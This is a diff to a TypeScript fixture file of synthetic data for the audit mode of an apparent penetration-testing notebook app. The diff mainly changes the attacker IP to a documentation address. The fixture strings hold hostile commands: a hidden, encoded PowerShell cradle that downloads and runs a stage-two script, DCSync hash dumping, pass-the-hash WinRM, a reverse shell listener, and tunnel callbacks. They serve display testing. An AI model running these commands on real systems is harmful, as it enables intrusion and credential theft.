@@ -1,5 +1,6 @@
-// Synthetic stress data for audit mode. Nothing here is real: documentation-style names, 10.10.x.x (RFC 5737
-// and example.test for the Payloads drill) addresses and placeholder secrets only. Timestamps are relative to AUDIT_NOW so screenshots are stable.
+// Synthetic stress data for audit mode. Nothing here is real: documentation-style names, invented 10.10.x.x target
+// addresses, RFC 5737 addresses (192.0.2.10 for the attacker; 198.51.100.x and example.test for the Payloads drill)
+// and placeholder secrets only. Timestamps are relative to AUDIT_NOW so screenshots are stable.
 import type { AccessGrant, CredAttempt, Credential, TriedPair, Username } from "../types/credentials";
 import type { ChecklistItem } from "../types/checklist";
 import type { CleanupItem } from "../types/cleanup";
@@ -212,7 +213,7 @@ const services: Service[] = [
 
 // ---------------------------------------------------------------- log
 
-const BLOB = btoa("IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.7/stage2.ps1'); Invoke-Beacon -Sleep 30 ".repeat(5)).slice(0, 372);
+const BLOB = btoa("IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.10/stage2.ps1'); Invoke-Beacon -Sleep 30 ".repeat(5)).slice(0, 372);
 const LONG_ONE_LINER = `powershell.exe -nop -w hidden -ep bypass -enc ${BLOB}`;
 const LONG_PATH = String.raw`C:\Program Files (x86)\Acme Corp\Finance Suite\Reporting Services\Deployment\Config\Prod\connection.config`;
 const SHORT_FLAGS = "rustscan --ulimit=5000 --range=1-65535";
@@ -257,12 +258,12 @@ const labLog: LogEntry[] = [
   cmd("DCSync", "impacket-secretsdump -just-dc acme.corp/Administrator@10.10.20.10 -hashes :aad3b435b51404eeaad3b435b51404ee", "Administrator:500:aad3b435b51404eeaad3b435b51404ee:0123456789abcdef0123456789abcdef:::", ["h-dc01"]),
   cmd("Web directory brute force", "feroxbuster -u http://10.10.20.15 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt -t 50", "200  GET  1l  1w  12c  http://10.10.20.15/\n301  GET  9l  28w  315c  http://10.10.20.15/admin\n403  GET  9l  28w  277c  http://10.10.20.15/server-status"),
   cmd("Anonymous FTP check", "ftp 10.10.20.15", "Connected to 10.10.20.15.\n220 (vsFTPd 3.0.3)\nName: anonymous\n530 Login incorrect.", ["h-web"], { returnedNothing: true }),
-  cmd("Tunnel agent start", "./agent -connect 10.10.14.7:11601 -ignore-cert", "INFO[0000] Connection established  addr=\"10.10.14.7:11601\"", ["h-pivot"]),
+  cmd("Tunnel agent start", "./agent -connect 192.0.2.10:11601 -ignore-cert", "INFO[0000] Connection established  addr=\"192.0.2.10:11601\"", ["h-pivot"]),
   cmd("Second subnet sweep through the tunnel", "nmap -sn 10.10.21.0/24", "Nmap scan report for 10.10.21.4\nNmap scan report for 10.10.21.9", ["h-pivot"]),
   cmd("MSSQL xp_cmdshell", "impacket-mssqlclient acme.corp/svc_sql:'Password123!'@10.10.20.22 -windows-auth", "SQL> EXEC xp_cmdshell 'whoami'\nacme\\svc_sql", ["h-sql01"]),
   cmd("WinRM shell on dc01", "evil-winrm -i 10.10.20.10 -u Administrator -H 0123456789abcdef0123456789abcdef", "*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> whoami\nacme\\administrator", ["h-dc01"]),
   cmd("SNMP walk", "snmpwalk -v2c -c public 10.10.20.15 1.3.6.1.2.1.25.4.2.1.2", "iso.3.6.1.2.1.25.4.2.1.2.1 = STRING: \"systemd\"\niso.3.6.1.2.1.25.4.2.1.2.412 = STRING: \"apache2\"", ["h-web"]),
-  cmd("Reverse shell listener", "rlwrap nc -lvnp 4444", "listening on [any] 4444 ...\nconnect to [10.10.14.7] from (UNKNOWN) [10.10.20.15] 51514\nwww-data@web:/var/www/html$", ["h-web"]),
+  cmd("Reverse shell listener", "rlwrap nc -lvnp 4444", "listening on [any] 4444 ...\nconnect to [192.0.2.10] from (UNKNOWN) [10.10.20.15] 51514\nwww-data@web:/var/www/html$", ["h-web"]),
   entry({ kind: "http", title: "Login request with an oversized JWT cookie", hostIds: ["h-web"], content: { kind: "http", request: `GET /admin/reports?month=2026-10&format=csv&token=${BLOB} HTTP/1.1\nHost: web-portal-dmz-frontend-01.dmz.acme.corp\nCookie: session=${BLOB.slice(0, 120)}\n\n`, response: "HTTP/1.1 403 Forbidden\nContent-Type: text/html\nContent-Length: 277\n\n<h1>Forbidden</h1>" } }),
   entry({ kind: "http", title: "Upload form probe", hostIds: ["h-web"], content: { kind: "http", request: "POST /upload HTTP/1.1\nHost: 10.10.20.15\nContent-Type: multipart/form-data; boundary=x\n\n--x\nContent-Disposition: form-data; name=\"f\"; filename=\"a.php\"\n\n<?php echo 1;\n--x--", response: null } }),
   note("A very long note title that keeps going to see how the log row handles a heading with no natural break points at all", "Found the finance DMZ gateway. It has a second NIC on 10.10.21.0/24 which is not in scope yet; confirm with the lab guide before touching it.", ["h-pivot"]),
@@ -420,7 +421,7 @@ const vectors: PrivescVector[] = [
 // ---------------------------------------------------------------- network, notes, cleanup
 
 const tunnels: Tunnel[] = [
-  { id: "t-1", engagementId: "e-lab", kind: "ligolo", viaHostId: "h-pivot", subnets: ["10.10.21.0/24", "10.10.22.0/24"], callbackIp: "10.10.14.7", status: "up", notes: "ligolo-ng agent, tun interface ligolo", createdAt: ago(50 * MIN), updatedAt: ago(50 * MIN) },
+  { id: "t-1", engagementId: "e-lab", kind: "ligolo", viaHostId: "h-pivot", subnets: ["10.10.21.0/24", "10.10.22.0/24"], callbackIp: "192.0.2.10", status: "up", notes: "ligolo-ng agent, tun interface ligolo", createdAt: ago(50 * MIN), updatedAt: ago(50 * MIN) },
 ];
 
 const hops: Hop[] = [
@@ -467,7 +468,7 @@ const backups: BackupInfo[] = [
 ];
 
 const settings: Settings = {
-  autoLockMinutes: 30, backupRetention: 14, machines: ["Kali (VM)", "Windows 11 (VM)"], attackerIp: "10.10.14.7",
+  autoLockMinutes: 30, backupRetention: 14, machines: ["Kali (VM)", "Windows 11 (VM)"], attackerIp: "192.0.2.10",
   listenerPort: "4444", kaliUser: "audit", windowsToolsDir: "~/tools/windows", linuxToolsDir: "/opt/tools",
   fieldManualPath: "/Users/audit/Documents/Field-Manual", nvdKeySet: true,
 };
